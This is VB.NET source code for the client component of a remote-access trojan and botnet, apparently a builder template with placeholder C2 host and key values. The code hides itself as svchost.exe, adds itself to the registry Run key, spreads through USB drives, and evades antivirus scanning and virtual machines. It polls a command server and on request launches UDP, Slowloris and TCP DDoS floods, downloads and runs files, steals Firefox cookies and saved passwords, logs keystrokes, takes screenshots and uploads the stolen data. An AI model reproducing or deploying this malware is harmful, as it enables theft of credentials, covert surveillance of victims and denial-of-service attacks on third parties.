﻿Imports System.Threading
Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Security
Imports System.Security.Cryptography
Imports System.Management
Imports System.Drawing.Imaging

Public Class Form1
    Public Host As String = "[HOST]"
    Public ID As String = "[ID]"
    Public Startup As String = "[Startup]"
    Public HardInstall As String = "[HardInstall]"
    Public StartName As String = "[StartupName]"
    Public BypassScanning As String = "[BypassSCP]"
    Public USBSpread As String = "[USBSpread]"
    Public AntiVM As String = "[AntiVM]"
    Public RSAKey As String = "[RSAKey]"
    Public RSAStatus As String = "[RSAStatus]"
    Public InstallName As String = "[Install_Name]"
    Public PathS As String = "[Install_Path]"
    Public WatcherStatus As String = "[Watcher_Status]"
    Public WatcherBytes As String = "[Watcher_Bytes]"
    Public st As Integer = 0
    Public Y As String = "|BN|"
    Public trd As System.Threading.Thread
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Public MTX As String = "[MUTEX]"
    Public MT As Mutex = Nothing
    Public s As String = New IO.FileInfo(Application.ExecutablePath).Name
    Public LogsPath As String = IO.Path.GetTempPath & "\" & s & ".txt"
    Public C As HTTP = New HTTP
    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        C.Send("Offline")
        Application.Exit()
    End Sub
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        C.Send("Offline")
        Application.Exit()
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            If My.Settings.updateStatus = True Then
                If (Application.ExecutablePath = IO.Path.GetTempPath & "\svchost.exe") Then
                    Return
                Else
                    Process.Start(IO.Path.GetTempPath & "\svchost.exe")
                    Application.Exit()
                End If
            End If

            If My.Settings.moveStatus = True Then
                C.Host = My.Settings.newHost
            Else
                If RSAStatus = "True" Then
                    C.Host = RSA_Decrypt(Host, RSAKey)
                Else
                    C.Host = Host
                End If
            End If

            C.ID = ID & "_" & HWD()
            C.Connect()
            C.Send("Online")

            If Startup = "True" Then
                st = 0
                trd = New System.Threading.Thread(Sub() StartWork(True))
                trd.IsBackground = True
                trd.Start()
            End If

            If BypassScanning = "True" Then
                Dim bypass As New Screening_Programs
                bypass.Start()
            End If

            If AntiVM = "True" Then
                Dim AntiVirtual As New AntiVM
                AntiVirtual.ST(Application.ExecutablePath)
            End If

            If USBSpread = "True" Then
                Dim USB As USB = New USB
                USB.ExeName = "svchost.exe"
                USB.Start()
            End If

            If HardInstall = "True" Then
                Call Install_Server()
                If Application.ExecutablePath = Environ(PathS) & "\Microsoft\MyClient\" & InstallName Then
                    C.Send("Online")
                Else
                    Process.Start(Environ(PathS) & "\Microsoft\MyClient\" & InstallName)
                    Application.Exit()
                    Try
                        IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden + FileAttributes.System)
                    Catch ex As Exception

                    End Try
                    End
                End If
            End If


            If WatcherStatus = "True" Then
                Watchdog.NewWatchdog(WatcherBytes)
            End If

            st = 0
            Dim t As New Threading.Thread(Sub() IND(True))
            t.IsBackground = True
            t.Start()

            Try
                For Each x In Process.GetProcesses
                    Try
                        If CompDir(New IO.FileInfo(x.MainModule.FileName), LO) Then
                            If x.Id > Process.GetCurrentProcess.Id Then
                                End
                            End If
                        End If
                    Catch ex As Exception
                    End Try
                Next
            Catch ex As Exception
            End Try
            Try
                Mutex.OpenExisting(MTX)
                End
            Catch ex As Exception
            End Try
            Try
                MT = New Mutex(True, MTX)
            Catch ex As Exception
                End
            End Try
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Public Sub Install_Server()
        If Application.ExecutablePath = Environ(PathS) & "\Microsoft\MyClient\" & InstallName Then
            C.Send("Online")
            Return
        Else
            On Error Resume Next
            If IO.Directory.Exists(Environ(PathS) & "\Microsoft\MyClient\") Then
                ' Nothing
            Else
                IO.Directory.CreateDirectory(Environ(PathS) & "\Microsoft\MyClient\")
                File.SetAttributes(Environ(PathS) & "\Microsoft\MyClient\", FileAttributes.Hidden + FileAttributes.System)
            End If
            Dim KA As String
            KA = "Microsoft" & "\MyClient\"
            If File.Exists(Environ(PathS) & "\" & KA & InstallName) Then
                IO.File.Delete(Environ(PathS) & "\" & KA & InstallName)
                Melt(Environ(PathS) & "\" & KA & InstallName)
            Else
                Melt(Environ(PathS) & "\" & KA & InstallName)
            End If
        End If
    End Sub
    Public Sub Melt(filename As String)
        Try
            File.Copy(Application.ExecutablePath, filename, True)
            File.SetAttributes(filename, FileAttributes.System + FileAttributes.Hidden)
            AStartup(StartName, filename)
        Catch ex As Exception

        End Try
    End Sub
    Public Function RSA_Decrypt(ByVal Input As String, ByVal Key As String) As String
        Dim plain As Byte()
        Using rsa As RSACryptoServiceProvider = New RSACryptoServiceProvider(2048)
            rsa.PersistKeyInCsp = False
            rsa.FromXmlString(Key)
            Dim buffer As Byte() = Convert.FromBase64String(Input)
            plain = rsa.Decrypt(buffer, True)
        End Using
        Return System.Text.Encoding.UTF8.GetString(plain)
    End Function

    Public Function checkBlacklist() As Boolean
        Return My.Settings.blacklist
    End Function

    Public Sub IND(ByVal x As Boolean)
        Do While x = True
            Dim GetCommand As New WebClient
            Dim CurrentHost As String
            If RSAStatus = "True" Then : CurrentHost = RSA_Decrypt(Host, RSAKey) : Else : CurrentHost = Host : End If
            Dim Command As String = GetCommand.DownloadString(CurrentHost & "/getCommand.php?id=" & ID & "_" & HWD())
            Dim A As String() = Split(Command, Y)
            On Error Resume Next
            Select Case A(0)
                Case "Ping"
                    C.Send("Online")

                Case "StartDDOS"
                    Select Case A(1)
                        Case "UDPAttack"
                            UDP.Host = A(2)
                            UDP.Threadsto = 1000
                            UDP.Time = 10000
                            UDP.Start()
                            C.Send("CleanCommands")

                        Case "SlowlorisAttack"
                            Slowloris.StartSlowloris(A(2), 1000, 10000, Randomisi(300))
                            C.Send("CleanCommands")

                        Case "ARMEAttack"
                            ARME.StartARME(A(2), 1000, 10000, Randomisi(300))
                            C.Send("CleanCommands")

                        Case "TCPAttack"

                            Condis.StartCondis(A(2), 1000, 10000, Randomisi(300))
                            C.Send("CleanCommands")
                    End Select

                Case "StopDOOS"
                    Select Case A(1)
                        Case "UDPAttack"
                            UDP.Abort()
                            C.Send("CleanCommands")

                        Case "SlowlorisAttack"
                            Slowloris.StopSlowloris()
                            C.Send("CleanCommands")

                        Case "ARMEAttack"
                            ARME.StopARME()
                            C.Send("CleanCommands")

                        Case "TCPAttack"
                            Condis.StopCondis()
                            C.Send("CleanCommands")
                    End Select

                Case "UploadFile"
                    Dim DownloadFile As New WebClient
                    Dim File() As Byte = DownloadFile.DownloadData(A(1))
                    IO.File.WriteAllBytes(Environ("Temp") & "\" & A(2), File)
                    Process.Start(Environ("Temp") & "\" & A(2))
                    C.Send("CleanCommands")

                Case "OpenPage"
                    Process.Start(A(1))
                    C.Send("CleanCommands")

                Case "OpenHidden"
                    Dim WebThread As New Thread(Sub() OpenWebHidden(A(1)))
                    WebThread.IsBackground = True
                    WebThread.Start()
                    C.Send("CleanCommands")

                Case "Uninstall"
                    C.Send("Uninstall")
                    DStartup(StartName)
                    Watchdog.StopWatcher(True)
                    Me.Close()
                    Application.Exit()

                Case "Close"
                    C.Send("CleanCommands")
                    C.Send("Offline")
                    Watchdog.StopWatcher(False)
                    Application.Exit()

                Case "ShowMessageBox"
                    Dim msgIcon As MessageBoxIcon
                    Dim msgButton As MessageBoxButtons

                    Select Case A(3)
                        Case "None"
                            msgIcon = MessageBoxIcon.None
                        Case "Information"
                            msgIcon = MessageBoxIcon.Information
                        Case "Asterisk"
                            msgIcon = MessageBoxIcon.Asterisk
                        Case "Critical"
                            msgIcon = MessageBoxIcon.Error
                        Case "Warning"
                            msgIcon = MessageBoxIcon.Warning
                        Case "Question"
                            msgIcon = MessageBoxIcon.Question
                    End Select

                    Select Case A(4)
                        Case "OkOnly"
                            msgButton = MessageBoxButtons.OK
                        Case "OkCancel"
                            msgButton = MessageBoxButtons.OKCancel
                        Case "YesNo"
                            msgButton = MessageBoxButtons.YesNo
                        Case "YesNoCancel"
                            msgButton = MessageBoxButtons.YesNoCancel
                        Case "AbortRetryIgnore"
                            msgButton = MessageBoxButtons.AbortRetryIgnore
                        Case "RetryCancel"
                            msgButton = MessageBoxButtons.RetryCancel
                    End Select

                    MessageBox.Show(A(1), A(2), msgButton, msgIcon)
                    C.Send("CleanCommands")

                Case "MoveClient"
                    My.Settings.moveStatus = True
                    My.Settings.newHost = A(1)
                    My.Settings.Save()
                    C.Send("Uninstall")
                    Application.Restart()

                Case "Blacklist"
                    My.Settings.blacklist = True
                    My.Settings.Save()
                    C.Send("Uninstall")
                    Application.Exit()

                Case "Screenshot"
                    Dim Screenshot As New RemoteDesktop
                    Screenshot.Host = Host
                    Screenshot.ID = ID + "_" + HWD()
                    Screenshot.Start()
                    C.Send("CleanCommands")

                Case "StealCookie"
                    On Error Resume Next
                    Dim directories As String() = Directory.GetDirectories("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles")
                    Dim i As Integer = 0
                    While i < directories.Length
                        Dim text2 As String = directories(i)
                        Dim flag As Boolean = File.Exists("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles" + text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty) + "\cookies.sqlite")
                        If flag Then
                            Dim name As String = text2.Replace("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles", String.Empty)
                            IO.File.Copy("C:\Users\" + Environment.UserName + "\AppData\Roaming\Mozilla\Firefox\Profiles\" + name + "\cookies.sqlite", IO.Path.GetTempPath & "\" & "cookies.sqlite", True)
                        End If
                        i = i + 1
                    End While
                    C.Upload(IO.Path.GetTempPath & "cookies.sqlite")
                    C.Send("CleanCommands")

                Case "InstalledSoftwares"
                    ProgramList()
                    C.Upload(Path.GetTempPath & "\\ProgramList.txt")
                    C.Send("CleanCommands")

                Case "StartKeylogger"
                    On Error Resume Next
                    Dim tt As Thread = New Thread(AddressOf LimeLogger.Start, 1)
                    tt.IsBackground = True
                    tt.Start()
                    C.Send("CleanCommands")

                Case "RetriveLogs"
                    On Error Resume Next
                    C.Upload(LogsPath)
                    C.Send("CleanCommands")

                Case "StealPassword"
                    StealPasswords("ps")
                    C.Send("CleanCommands")

                Case "UpdateClient"
                    UpdateClient(A(1))
                    C.Send("CleanCommands")
            End Select
        Loop
    End Sub
    Public Function UpdateClient(ByVal URL As String)
        Try
            Dim Download As New WebClient
            Download.DownloadFile(URL, IO.Path.GetTempPath & "\svchost.exe")
            IO.File.SetAttributes(IO.Path.GetTempPath & "\svchost.exe", FileAttributes.Hidden + FileAttributes.System)
            My.Settings.updateStatus = True
            My.Settings.Save()
            Process.Start(IO.Path.GetTempPath & "\svchost.exe")
            Application.Exit()
            Return True
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function
    Public Sub OpenWebHidden(Url As Object)
        Dim openpage As New WebBrowser
        openpage.ScriptErrorsSuppressed = True
        openpage.Navigate(DirectCast(Url, String))
        Application.Run()
    End Sub
    Public Function StealPasswords(ByVal PluginName As String)
        Try
            Dim Plugin As New WebClient
            Dim PluginData As Byte() = Plugin.DownloadData(Host & "/plugins/" & PluginName & ".dll")
            Dim p = System.Reflection.Assembly.Load(PluginData)
            Dim getPassword = p.CreateInstance(DEB("UGFzc3dvcmRTdGVhbGVyLlN0ZWVsUGFzc3dvcmQ="))
            IO.File.WriteAllText(IO.Path.GetTempPath & "/Passwords.txt", ENB(getPassword.Dump()))
            C.Upload(IO.Path.GetTempPath & "/Passwords.txt")
            Return True
        Catch ex As Exception
            Return ex.Message
        End Try
    End Function
    Function GetAntiVirus() As String
        Try
            Dim str As String = Nothing
            Dim searcher As New ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As ManagementObject In instances
                str = queryObj("displayName").ToString()
            Next
            If str = String.Empty Then str = "N/A"
            str.ToString()
            Return str
            searcher.Dispose()
        Catch
            Return "N/A"
        End Try
    End Function
    Public Function ProgramList()
        On Error Resume Next
        Dim TextBox2 As New TextBox
        Dim folderPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)
        For Each text As String In Directory.GetDirectories(folderPath)
            Dim text2 As String = text.Substring(text.LastIndexOf("\")).Replace("\", String.Empty) & vbCrLf
            TextBox2.AppendText(text2)
            File.WriteAllText(Path.GetTempPath() + "\\ProgramList.txt", TextBox2.Text)
        Next
    End Function
    Public Function Randomisi(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "•¥µ☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي~!@#$%^&*()+-/><".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Function HWD() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "ERR"
        End Try
    End Function
    Public Function DEB(ByRef s As String) As String ' Decode Base64
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function ENB(ByRef s As String) As String ' Encode base64
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Private Function CompDir(ByVal F1 As IO.FileInfo, ByVal F2 As IO.FileInfo) As Boolean ' Compare 2 path
        If F1.Name.ToLower <> F2.Name.ToLower Then Return False
        Dim D1 = F1.Directory
        Dim D2 = F2.Directory
re:
        If D1.Name.ToLower = D2.Name.ToLower = False Then Return False
        D1 = D1.Parent
        D2 = D2.Parent
        If D1 Is Nothing And D2 Is Nothing Then Return True
        If D1 Is Nothing Then Return False
        If D2 Is Nothing Then Return False
        GoTo re
    End Function
    Public Sub StartWork(ByVal x As Boolean)
        Do While x = True
            System.Threading.Thread.Sleep(5000)
            AStartup(StartName, Application.ExecutablePath)
        Loop
    End Sub
End Class
Module Extra
    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public Sub DStartup(ByVal Name As String)
        On Error Resume Next
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.DeleteValue(Name)
    End Sub
End Module